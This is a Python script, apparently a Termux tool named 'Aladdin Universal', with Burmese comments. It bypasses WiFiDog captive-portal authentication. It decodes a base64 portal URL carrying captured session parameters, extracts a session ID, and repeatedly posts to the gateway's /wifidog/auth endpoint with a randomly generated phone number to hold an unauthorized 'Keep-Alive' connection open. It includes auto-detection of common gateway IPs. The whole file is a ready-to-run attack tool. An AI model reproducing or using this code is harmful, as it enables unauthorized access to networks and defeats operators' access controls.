import os
import re
import sys
import base64
import random
import string
import time
import asyncio
import aiohttp
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

# Termux Home Directory ကို အသုံးပြုခြင်း
HOME_PATH = os.path.expanduser("~") 
IP_FILE = os.path.join(HOME_PATH, ".aladdin_ip")

def Logo():
    os.system("clear")
    print(f"{b}    ___    __    ___    ____  ____  _____  _   __")
    print(f"   /   |  / /   /   |  / __ \/ __ \/  _/ |/ / / /")
    print(f"  / /| | / /   / /| | / / / / / / // / |   / / / ")
    print(f" / ___ |/ /___/ ___ |/ /_/ / /_/ // / /   |/_/  ")
    print(f"/_/  |_/_____/_/  |_/_____/_____/___//_/|_/(_)  {w}")
    print(f"{g}           [ ALADDIN UNIVERSAL v12.2 ]{w}")
    print("-" * 50)

class AladdinTool:
    def __init__(self):
        # Raw URL Decode Logic (Modified for safety)
        raw_url = b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ=='
        self.session_url = base64.b64decode(raw_url).decode('utf-8', errors='ignore')
        
        # IP ကို ဖိုင်ကနေ ဖတ်မယ်၊ မရှိရင် default သုံးမယ်
        if os.path.exists(IP_FILE):
            with open(IP_FILE, "r") as f:
                self.ip = f.read().strip()
        else:
            self.ip = "192.168.0.1"

    async def keep_alive(self):
        Logo()
        print(f"{g}[+] Internet Keep-Alive Running...{w}")
        print(f"{y}[*] Target Gateway: {self.ip}{w}")
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            session_id = None
            while True:
                if not session_id:
                    # Session ID ရဖို့ Portal URL ကို ခေါ်မယ်
                    async with session.get(self.session_url, timeout=15, ssl=False) as req:
                        match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                        session_id = match.group(1) if match else None
                
                if session_id:
                    params = {'token': session_id, 'phoneNumber': '09'+''.join(random.choice(string.digits) for _ in range(8))}
                    try:
                        # Auth post logic
                        async with session.post(f"http://{self.ip}:2060/wifidog/auth?", params=params, timeout=10) as res:
                            print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {res.status} - Online{w}")
                    except: session_id = None
                else:
                    print(f"{r}[!] Session ID not found. Check WiFi Portal.{w}", end='\r')
                await asyncio.sleep(5)

def setup_process():
    Logo()
    print(f"{y}[*] Select Setup Mode:{w}")
    print("[1] Auto Detect Gateway")
    print("[2] Manual Enter Gateway IP (Recommended)")
    mode = input(f"\n{y}Select Mode > {w}")

    if mode == '2':
        ip = input(f"{y}[?] Enter Router IP (e.g., 192.168.110.1) : {w}")
        if ip:
            with open(IP_FILE, "w") as f: f.write(ip)
            print(f"{g}[+] IP Saved: {ip}{w}")
    else:
        # Auto detection logic ကို တိုးမြှင့်ထားတယ်
        targets = ["192.168.0.1", "192.168.1.1", "192.168.110.1"]
        found = False
        for target in targets:
            print(f"{w}[*] Checking {target}...{w}", end='\r')
            try:
                r = requests.get(f"http://{target}", timeout=5, verify=False)
                if "gw_address" in r.url:
                    ip = re.search('gw_address=(.*?)&', r.url).group(1)
                    with open(IP_FILE, "w") as f: f.write(ip)
                    print(f"{g}[+] Found & Saved: {ip}         {w}")
                    found = True
                    break
            except: pass
        if not found:
            print(f"{r}[!] Auto detection failed. Please use Manual Mode.{w}")
    time.sleep(2)

if __name__ == "__main__":
    while True:
        tool = AladdinTool() # ချိန်ထားတဲ့ IP ကို ဖတ်ဖို့ loop တိုင်းမှာ re-init လုပ်မယ်
        Logo()
        print(f"{y}Current IP: {tool.ip}{w}")
        print("-" * 50)
        print("[1] Start Setup (Manual/Auto)")
        print("[2] Internet Keep-Alive")
        print("[0] Exit")
        choice = input(f"\n{y}Select > {w}")
        if choice == '1': 
            setup_process()
        elif choice == '2':
            try: asyncio.run(tool.keep_alive())
            except KeyboardInterrupt: pass
        elif choice == '0': break
                  
